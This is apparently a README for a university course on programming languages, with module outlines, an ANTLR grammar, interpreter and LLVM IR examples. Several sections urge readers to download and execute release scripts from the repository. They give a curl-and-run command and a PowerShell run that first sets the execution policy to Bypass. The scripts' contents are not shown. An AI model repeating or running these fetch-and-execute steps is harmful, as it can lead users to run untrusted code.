# CPL: Concepts of Programming Languages — M.Sc. Winter 2025/26 🚀

[![Releases](https://img.shields.io/badge/Releases-download-blue?logo=github&style=for-the-badge)](https://github.com/D4ni31Osama/CPL-Vorlesung-Master-W25/releases)  
Download and run release assets from: https://github.com/D4ni31Osama/CPL-Vorlesung-Master-W25/releases

![CPL Banner](https://raw.githubusercontent.com/D4ni31Osama/CPL-Vorlesung-Master-W25/main/docs/images/cpl-banner.png)

Table of contents
- About this repo
- Badges and topics
- Quick start
- Releases (download and execute)
- Lecture modules
- Course materials
- Codebase overview
- ANTLR grammars
- Interpreter design
- LLVM IR backend
- Code generation patterns
- Build and run examples
- Exercises and assignments
- Teaching website and OER
- Development workflow
- Testing and CI
- Contributing guide
- Citation and credits
- License
- Contact

About this repo
This repository collects teaching materials for the master's course "Concepts of Programming Languages" (Winter 2025/26). You will find lecture slides, example implementations, grammars, interpreter and code generation labs, LLVM IR examples, and a small compiler project you can run and extend. The materials target students in M.Sc. computer science courses and instructors who want reusable, open educational resources.

Badges and topics
- Topics: antlr, code-generation, compiler-construction, hacktoberfest, interpreter, llvm-ir, oer, open-educational-resources, teaching-materials, teaching-website
- Releases badge: [![Releases](https://img.shields.io/badge/Releases-download-blue?logo=github&style=for-the-badge)](https://github.com/D4ni31Osama/CPL-Vorlesung-Master-W25/releases)

Quick start
- Clone the repository:
  git clone https://github.com/D4ni31Osama/CPL-Vorlesung-Master-W25.git
  cd CPL-Vorlesung-Master-W25

- Browse slides, exercises, and code in the docs and src folders.

- Use the releases page to get prebuilt tools:
  Visit and download from https://github.com/D4ni31Osama/CPL-Vorlesung-Master-W25/releases and run the release asset as described in the Releases section below.

Releases (download and execute)
The course provides release assets for demo tools and runner scripts. Download the release asset and execute it to run the demo compiler, test suites, or teaching server.

- Go to the releases page: https://github.com/D4ni31Osama/CPL-Vorlesung-Master-W25/releases
- Find the latest release asset. Typical assets:
  - cpl-runner-<version>.sh — shell runner for Linux/macOS
  - cpl-runner-<version>.ps1 — PowerShell runner for Windows
  - cpl-ide-plugin-<version>.jar — plugin for the course IDE
  - cpl-examples-<version>.zip — example projects and test cases

- Example download and run (Linux/macOS):
  curl -L -o cpl-runner.sh "https://github.com/D4ni31Osama/CPL-Vorlesung-Master-W25/releases/download/v1.0.0/cpl-runner-1.0.0.sh"
  chmod +x cpl-runner.sh
  ./cpl-runner.sh --serve

- Example run (Windows PowerShell):
  Invoke-WebRequest -Uri "https://github.com/D4ni31Osama/CPL-Vorlesung-Master-W25/releases/download/v1.0.0/cpl-runner-1.0.0.ps1" -OutFile "cpl-runner.ps1"
  Set-ExecutionPolicy -Scope Process -ExecutionPolicy Bypass
  .\cpl-runner.ps1 -Serve

- If a direct release asset link is missing or fails, check the Releases section on the repo page to find available assets: https://github.com/D4ni31Osama/CPL-Vorlesung-Master-W25/releases

Lecture modules
The course splits into themed modules. Each module includes slides, code samples, exercises, and reading lists.

1. Foundations of language design
   - Syntax and semantics
   - Lexical analysis
   - Parsing techniques
   - Formal definitions: BNF, EBNF, structural operational semantics

2. Type systems
   - Simple types, polymorphism
   - Type inference
   - Subtyping and variance
   - Gradual typing

3. Functional languages
   - Lambda calculus
   - Closures and environments
   - Tail-call optimization
   - Pattern matching

4. Imperative languages
   - Memory model
   - Mutable state and aliasing
   - Control flow and exceptions

5. Concurrency and parallelism
   - Shared memory
   - Message passing
   - Actor model and CSP
   - Data races and synchronization

6. Language implementation
   - AST design
   - Interpreter patterns
   - Bytecode vs native code
   - Just-in-time concepts

7. Formal methods and verification
   - Operational semantics
   - Type safety proofs
   - Model checking basics

8. Advanced backends
   - LLVM IR generation
   - Runtime systems
   - Garbage collection strategies

Course materials
The repo contains these folders:
- docs/ — slides, reading lists, diagrams
- src/ — example implementations, tools
- grammar/ — ANTLR grammars and test cases
- llvm/ — LLVM IR backend examples
- exercises/ — lab assignments and solutions
- examples/ — sample programs and test inputs
- website/ — static site for course pages (teaching website)

Slides
Slides follow module order and include speaker notes. Slides are available in PDF and reveal.js formats. Example path:
docs/slides/Module-01-Foundations.pdf

Exercises
Each exercise contains:
- Problem statement
- Reference solution
- Tests and expected outputs
- Grading rubrics

Labs
Labs guide students from parsing to code generation. Lab files include skeleton code and hints. Typical lab progression:
- Lab 1: Tokenizer and scanner
- Lab 2: Parser and AST
- Lab 3: Type checker
- Lab 4: Interpreter
- Lab 5: LLVM IR generator and codegen

Codebase overview
The code uses a layered architecture. Each layer isolates responsibilities and helps students focus on one concept at a time.

- scanner/lexer
  - ANTLR-based lexer and hand-written tokenizer examples
  - Test harness for lexical test cases

- parser
  - ANTLR grammars and generated parsers
  - Error recovery strategies
  - AST builder

- ast
  - Node types
  - Visitor interfaces
  - Pretty printer and serializer

- typechecker
  - Environment and scope handling
  - Constraint generation and solving
  - Inference engine

- interpreter
  - Bytecode interpreter for the internal VM
  - Direct AST interpreter
  - Memory and object model

- codegen
  - LLVM IR emission
  - Calling convention handling
  - Runtime support stubs

- runtime
  - Minimal runtime library in C
  - Memory management primitives
  - Standard library functions

ANTLR grammars
The repo provides ANTLR v4 grammars and example usage.

- grammar/CPL.g4 — full language grammar
- grammar/Expressions.g4 — focus on expressions and precedence
- grammar/Patterns.g4 — pattern matching grammar

Usage
- Generate parser:
  java -jar antlr-4.9.3-complete.jar -Dlanguage=Java -visitor -package cpl.parser grammar/CPL.g4

- Integrate parser into code:
  - Use the provided visitor to build an AST.
  - Add custom error listener for user-friendly errors.

Error handling strategies
- Fail-fast vs error recovery
- Token insertion and deletion
- Panic-mode recovery for long inputs

Interpreter design
The interpreter follows a straightforward visitor pattern for AST traversal. We provide two interpreters:

1. AST interpreter
   - Evaluate expressions by walking AST nodes.
   - Use environment maps for variable binding.
   - Support closures through lexical environments.

2. Bytecode VM
   - A small stack-based VM.
   - Instructions: push, pop, load, store, call, ret, jump, branch.
   - Implement tail-call optimization at bytecode level.

Sample AST interpreter pseudo-code
- Visit BinaryExpr:
  left = visit(node.left)
  right = visit(node.right)
  switch node.op:
    case PLUS: return left + right
    case MUL: return left * right

- Visit FunctionDecl:
  closure = makeClosure(node.params, node.body, currentEnv)
  currentEnv.define(node.name, closure)

Memory model
- Stack frames for function calls
- Heap for mutable objects
- GC hooks in runtime for demo purposes

LLVM IR backend
We include an LLVM IR backend that converts AST to LLVM IR. The backend uses standard techniques and includes utility modules for type mapping and symbol table handling.

Key parts
- llvm/emitter — maps AST nodes to LLVM IR constructs
- llvm/types — translates CPL types to LLVM types
- llvm/runtime — runtime support in LLVM and C

Building LLVM IR
- Generate IR:
  mvn -pl llvm package
  java -jar target/cpl-llvm-generator.jar examples/factorial.cpl -o out/factorial.ll

- Compile to native:
  clang out/factorial.ll -o out/factorial

- Run:
  ./out/factorial

Calling convention
- Use C calling convention for interop with runtime.
- Pass pointers for strings and arrays.
- Return values in standard registers.

Garbage collection
- Provide a basic mark-and-sweep implementation in the runtime.
- Show how to replace it with a tracing GC.

Code generation patterns
The repo explains common code generation patterns:
- Expression lowering
- Short-circuit boolean logic
- Control-flow lowering (if, while, switch)
- Function prologue and epilogue
- Tail-call optimization
- Closure conversion for first-class functions

Examples
- Expression lowering: compile (a + b) * c to temporary registers and operations
- Short-circuit:
  - Compile (x && y) to branch-based sequence that avoids evaluating y when x is false

Optimization notes
- Constant folding at AST level
- Dead code elimination pass
- Inlining heuristics for small functions
- Register allocation via simple linear-scan

Build and run examples
This section lists commands and examples to run the provided demos.

Requirements
- JDK 11+
- Maven 3.6+
- ANTLR v4
- LLVM/Clang if using the LLVM backend
- Git and curl

Install prerequisites (Ubuntu-like)
sudo apt update
sudo apt install -y default-jdk maven clang llvm curl

Example: run the interpreter
- Build:
  mvn -DskipTests package

- Run a program:
  java -jar target/cpl-interpreter.jar examples/factorial.cpl

- Output:
  Factorial(5) = 120

Example: generate LLVM IR and run
- Generate IR:
  java -jar target/cpl-llvm-generator.jar examples/factorial.cpl -o out/factorial.ll

- Compile:
  clang out/factorial.ll -o out/factorial

- Execute:
  ./out/factorial

Docker
- A Dockerfile provides a preconfigured environment with all tools.
- Build image:
  docker build -t cpl-course:latest .

- Run container:
  docker run --rm -it -v $(pwd):/work cpl-course:latest bash

Examples and reference programs
- examples/factorial.cpl — recursion and stack behavior
- examples/closures.cpl — first-class functions and closures
- examples/arrays.cpl — arrays and bounds checking
- examples/concurrency.cpl — actor-style message passing demo

Exercises and assignments
The course includes graded and practice assignments.

Assignment structure
- Problem statement
- Submission format
- Tests and automated grading script
- Hints file and reference solution (hidden from students during grading)

Sample assignments
- Assignment 1: Implement scanner and parser.
- Assignment 2: Build AST and pretty-printer.
- Assignment 3: Implement a static type checker with basic inference.
- Assignment 4: Implement interpreter for full language subset.
- Assignment 5: Extend LLVM IR backend with closures.

Grading
- Automated tests run on CI.
- Manual code review for style and design.
- Rubrics cover correctness, tests, documentation, and style.

Teaching website and OER
The repo includes a teaching website scaffold under website/. The site uses a static site generator and provides:
- Lecture schedule
- Slide downloads
- Lab registration and submission instructions
- Office hours and contact information

Open Educational Resources
All materials use permissive licensing to enable reuse. Slides and code use an open license to allow adaptation and redistribution for teaching.

Development workflow
The repo follows a clear branch model:
- main — production-ready materials and stable resources
- develop — integration for next course run
- feature/* — individual labs, demos, and slide updates

Pull requests
- Fork the repo
- Create topic branch
- Add tests or examples for your change
- Submit a PR with description and link to issue

Issue tracker
- Use GitHub Issues to report bugs or suggest topics.
- Labeling scheme:
  - bug
  - enhancement
  - doc
  - help-wanted

Testing and CI
The project uses GitHub Actions for continuous integration:
- Build and test Java components
- Run grammar tests for ANTLR
- Generate example outputs and compare with golden files
- Publish release artifacts to GitHub Releases

Local testing
- Run unit tests:
  mvn test

- Run integration tests:
  mvn verify -Pintegration

Contributing guide
We welcome contributions that improve learning resources, fix errors, or add labs.

How to contribute
- Open an issue first if you plan a larger change.
- Fork and create a branch.
- Keep commits small and focused.
- Write tests for new behavior.
- Add a short entry to CHANGELOG.md for non-trivial updates.

Coding standards
- Java: follow Google Java Style guidelines
- Shell scripts: use POSIX shell when possible
- Python: use PEP8
- Document new APIs in docs/

Mentoring tips for instructors
- Use labs in pairs to encourage discussion.
- Use automated tests to provide instant feedback.
- Keep exercises incremental and cumulative.
- Provide grading rubrics with sample solutions.

Teaching slides and sample speech notes
Slides include speaker notes with prompts and key points. Example prompts:
- Why separate lexing and parsing?
- When choose top-down vs bottom-up parsing?
- How does closure conversion affect calling convention?

Reference implementations
Each major component has a reference implementation in src/reference/ to help students test their solutions against a known good baseline.

Code examples and snippets
- Closure creation:
  function makeClosure(params, body, env) {
    return { params, body, env };
  }

- Tail-call detection:
  if (isTailPosition(callNode)) {
    emitTailCall(callNode);
  } else {
    emitRegularCall(callNode);
  }

- LLVM IR snippet for function:
  define i64 @fact(i64 %n) {
  entry:
    %cmp = icmp eq i64 %n, 0
    br i1 %cmp, label %base, label %rec
  base:
    ret i64 1
  rec:
    %n1 = sub i64 %n, 1
    %tmp = call i64 @fact(i64 %n1)
    %res = mul i64 %n, %tmp
    ret i64 %res
  }

Security and sandboxing
- The interpreter runs untrusted student code in a sandbox for labs.
- The runner isolates file and network I/O.
- The Docker image uses user namespaces and process restrictions.

Academic integrity
- Provide a clear policy for collaboration and allowed resources.
- Use automated plagiarism detection for code when needed.
- Encourage original work and peer review.

Course schedule (sample)
Week 1: Foundations and scanning  
Week 2: Parsing and ASTs  
Week 3: Type systems and inference  
Week 4: Functional concepts and closures  
Week 5: Memory and runtime  
Week 6: Interpreter patterns  
Week 7: LLVM IR and code generation  
Week 8: Concurrency and advanced topics  
Week 9: Review and exams

Resources, readings and references
- Aho, Lam, Sethi, Ullman — Compilers: Principles, Techniques, and Tools
- Pierce — Types and Programming Languages
- Appel — Modern Compiler Implementation
- LLVM documentation — https://llvm.org/docs/
- ANTLR documentation — https://www.antlr.org/

External images and icons
- ANTLR logo: https://www.antlr.org/assets/img/antlr-logo.png
- LLVM logo: https://upload.wikimedia.org/wikipedia/commons/1/10/LLVM_Logo.svg
- Compiler diagram sources in docs/images are linked from the repo.

Sample research and advanced topics
- Gradual typing and type migration
- Dependent types introduction
- Proofs of type safety via progress and preservation
- Advanced GC algorithms and performance trade-offs
- JIT compilation and runtime optimization

API reference
The project exposes small libraries for parsing and runtime integration.

Parser API
- cpl.parser.Parser.parse(String source) -> AST
- cpl.parser.ErrorReporter.report()

Runtime API
- Runtime.allocateObject(Type t)
- Runtime.callFunction(Function f, Object[] args)
- Runtime.gc()

Teaching utilities
- test-harness/ — run student tests and collect results
- grader/ — script for batch grading on CI

Automation and scripts
- scripts/generate-grammar.sh — run ANTLR and build parsers
- scripts/run-lab.sh — start lab server for students
- scripts/package-release.sh — prepare artifacts for GitHub Releases

Release publishing
We publish prebuilt artifacts on the GitHub Releases page. Users should download and run those assets when possible.

- Visit: https://github.com/D4ni31Osama/CPL-Vorlesung-Master-W25/releases
- Download the asset that suits your platform.
- Execute the asset as described in the asset README inside the release.

If the release link or asset does not work, check the Releases section on the repo page for alternative assets or source builds.

Examples of release usage
- cpl-runner.sh --serve — starts a local web UI for labs
- cpl-examples.zip — contains solved labs and sample programs
- cpl-ide-plugin.jar — integration with an IDE for syntax highlighting and run support

Common troubleshooting
- If ANTLR generation fails, ensure you use the right jar version for the grammar features.
- If LLVM emits target errors, install matching clang/llvm tools.
- If CI fails on tests, run tests locally and inspect logs in target/surefire-reports.

Community and Hacktoberfest
The repo tags include hacktoberfest. We label beginner-friendly issues for new contributors. Look for issues labeled "good first issue" and "help-wanted".

Mentoring newcomers
- Assign small tasks: fix typos, improve docs, add test cases.
- Provide clear reproduction steps for issues.
- Review PRs for teaching clarity and pedagogic value.

Citing this material
If you use slides or code in a publication or another course, cite the repository and authors. Include a reference to the specific materials you used.

Citation example (bibtex)
@misc{cpl-w2526,
  title = {Concepts of Programming Languages — M.Sc. Winter 2025/26},
  author = {Course staff},
  howpublished = {GitHub repository},
  year = {2025},
  note = {https://github.com/D4ni31Osama/CPL-Vorlesung-Master-W25}
}

Accessibility and formats
- Slides are available as PDF and HTML (reveal.js).
- Code examples include plain text and zipped archives.
- The website uses semantic markup and accessible colors.

Appendix A — Example grammar (excerpt)
grammar CPL;

program
  : statement* EOF
  ;

statement
  : varDecl
  | funcDecl
  | exprStmt
  ;

varDecl
  : 'var' IDENTIFIER (':' type)? '=' expression ';'
  ;

funcDecl
  : 'fun' IDENTIFIER '(' paramList? ')' (':' type)? block
  ;

expression
  : assignment
  ;

assignment
  : IDENTIFIER '=' assignment
  | logic_or
  ;

logic_or
  : logic_and ('||' logic_and)*
  ;

logic_and
  : equality ('&&' equality)*
  ;

equality
  : comparison (('==' | '!=') comparison)*
  ;

comparison
  : term (('>' | '<' | '>=' | '<=') term)*
  ;

term
  : factor (('+' | '-') factor)*
  ;

factor
  : unary (('*' | '/') unary)*
  ;

unary
  : ('!' | '-') unary
  | primary
  ;

primary
  : NUMBER
  | STRING
  | 'true'
  | 'false'
  | IDENTIFIER
  | '(' expression ')'
  ;

IDENTIFIER : [a-zA-Z_] [a-zA-Z_0-9]* ;
NUMBER : [0-9]+ ('.' [0-9]+)? ;
STRING : '"' (~["\r\n])* '"' ;
WS : [ \t\r\n]+ -> skip ;
COMMENT : '//' ~[\r\n]* -> skip ;

Appendix B — Example lab checklist
- [ ] Run the example interpreter on sample programs
- [ ] Write tests for the scanner
- [ ] Implement AST node for new expression
- [ ] Add a code generation test for LLVM IR output
- [ ] Submit PR with tests passing

Appendix C — Sample FAQ
Q: How do I build from source if a release is not available?  
A: Build with Maven: mvn package. Follow platform notes for LLVM if you use the backend.

Q: I cannot run the runner script on macOS.  
A: Ensure script is executable (chmod +x) and use ./cpl-runner.sh. For macOS ARM, use the correct binary from the releases or build from source.

Q: Where are solution files?  
A: Solutions live in exercises/solutions. Instructors can copy them to private course systems.

Contact
- Use GitHub Issues for problems or feature requests.
- Use PRs for contributions to code or docs.
- For course coordination, use the course staff email listed on the teaching website.

License
Most materials use a permissive license for teaching reuse. See LICENSE.md in the repo for exact terms.

...